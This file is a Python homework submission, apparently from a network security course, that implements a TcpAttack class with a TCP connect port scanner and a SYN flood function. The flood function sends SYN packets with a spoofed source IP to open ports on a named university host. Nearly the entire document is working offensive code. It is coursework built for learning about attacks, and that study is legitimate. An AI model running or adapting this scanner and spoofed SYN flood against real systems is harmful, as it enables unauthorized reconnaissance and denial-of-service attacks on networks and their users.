# Homework Number: HW08
# Name: Raghava Vivekananda Panchagnula
# ECN Login: rpanchag
# Due Date: 3/21/2024

#imports
from scapy.all import *
import socket


class TcpAttack:
    def __init__(self, spoofIP: str, targetIP: str)->None:
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart: int, rangeEnd: int)->None:
        verbosity = 0;        # set it to 1 if you want to see the result for each   #(1)
                            # port separately as the scan is taking place

        dst_host = self.targetIP                                                      #(2)
        start_port = rangeStart                                              #(3)
        end_port = rangeEnd                                                 #(4)

        open_ports = []                                                              #(5)
        # Scan the ports in the specified range:
        for testport in range(start_port, end_port+1):                               #(6)
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               #(7)
            sock.settimeout(0.1)                                                     #(8)
            try:                                                                     #(9)
                sock.connect( (dst_host, testport) )                                 #(10)
                open_ports.append(testport)                                          #(11)
                if verbosity: 
                    print("Open Port Found! - ",testport)                                       #(12)                                                  #(14)
            except:                                                                  #(15)
                if verbosity: 
                    print ("Port closed: ", testport  )                      #(16)

        # Now scan through the /etc/services file, if available, so that we can
        # find out what services are provided by the open ports.  The goal here
        # is to construct a dict whose keys are the port names and the values
        # the corresponding lines from the file that are "cleaned up" for
        # getting rid of unwanted white space:
        service_ports = {}
        if os.path.exists( "/etc/services" ):                                        #(19)
            IN = open("/etc/services")                                               #(20)
            for line in IN:                                                          #(21)
                line = line.strip()                                                  #(22)
                if line == '': continue                                              #(23)
                if (re.match( r'^\s*#' , line)): continue                            #(24)
                entries = re.split(r'\s+', line)                                     #(25)
                service_ports[ entries[1] ] =  ' '.join(re.split(r'\s+', line))      #(26)
            IN.close()                                                               #(27)
            
        OUT = open("openports.txt", 'w')                                             #(28)
        if not open_ports:                                                           #(29)
            print ("\n\nNo open ports in the range specified\n")                       #(30)    
        else:
            print ("\n\nThe open ports:\n\n")                                         #(31)    
            for k in range(0, len(open_ports)):          
                if len(service_ports) > 0:                                           #(33)
                    for portname in sorted(service_ports):                           #(34)
                        pattern = r'^' + str(open_ports[k]) + r'/'                   #(35)
                        if re.search(pattern, str(portname)):                        #(36)
                            print ("%d:    %s" %(open_ports[k], service_ports[portname]))
                    print(open_ports[k])
                else:
                    print(open_ports[k])
                OUT.write("%s\n" % open_ports[k])                                    #(39)
        OUT.close()       
        print("\n\n")

    def attackTarget(self, port: int, numSyn: int)->int:
        srcIP    = self.spoofIP                                                  #(1)
        destIP   = self.targetIP                                                     #(2)
        destPort = port                                                #(3)
        count    = numSyn                                               #(4)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                  #(5)
        if(sock.connect_ex((destIP, destPort)) == 0):
            print("Port is open")
            for i in range(count):                                                       #(5)
                IP_header = IP(src = srcIP, dst = destIP)                                #(6)
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
                packet = IP_header / TCP_header                                          #(8)
                try:                                                                     #(9)
                    send(packet) #set verbose = 0 if you dont want print                                                         #(10)
                except Exception as e:                                                   #(11)
                    print(e)
            return 1
        else:
            print("Port is closed")
            return 0

if __name__ == "__main__":
    spoofIP = "10.10.10.10"
    targetIP = "moonshine.ecn.purdue.edu"

    rangeStart = 1700
    rangeEnd = 1800

    numSyn = 10

    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)

    with open("openports.txt") as f:
        open_ports = f.readlines()
        open_ports = [int(x.strip()) for x in open_ports]
        if len(open_ports) == 0:
            print("No open ports in the range specified")
        else:
            for port in open_ports:
                if tcp.attackTarget(port, numSyn):
                    print(f"Port {port} was open, and flooded with {numSyn} SYN packets")